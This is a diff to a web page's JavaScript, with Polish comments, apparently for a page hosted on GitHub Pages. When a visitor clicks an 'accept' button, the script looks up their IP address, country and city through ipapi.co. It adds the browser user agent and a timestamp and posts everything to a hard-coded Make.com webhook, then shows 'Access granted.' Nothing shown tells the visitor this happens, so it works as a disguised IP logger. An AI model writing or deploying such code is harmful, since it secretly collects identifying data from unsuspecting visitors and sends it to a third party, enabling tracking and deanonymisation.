@@ -12,27 +12,29 @@
 <script>
 document.getElementById('accept').onclick = async function() {
     try {
-        // Pobranie IP + kraju przez darmowe API
-        let res = await fetch('https://ipapi.co/json/');
-        let data = await res.json();
+        // Pobranie danych o IP i lokalizacji
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
 
+        // Przygotowanie payload
         const payload = {
-            ip: data.ip,
-            country: data.country_name,
-            city: data.city,
+            ip: data.ip || 'BRAK',
+            country: data.country_name || 'BRAK',
+            city: data.city || 'BRAK',
             ua: navigator.userAgent,
             time: new Date().toISOString()
         };
 
-        // Wyślij dane do webhooka Make
+        // Wyślij do Make webhook
         await fetch('https://hook.eu1.make.com/2xjh6jkj7gc2o3xaydt5b1ag3dup6y54', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
+            body: JSON.stringify(payload),
+            mode: 'cors' // GitHub Pages może wymagać
         });
 
         alert('Dostęp przyznany.');
-    } catch(err) {
+    } catch (err) {
         console.error(err);
         alert('Coś poszło nie tak.');
     }
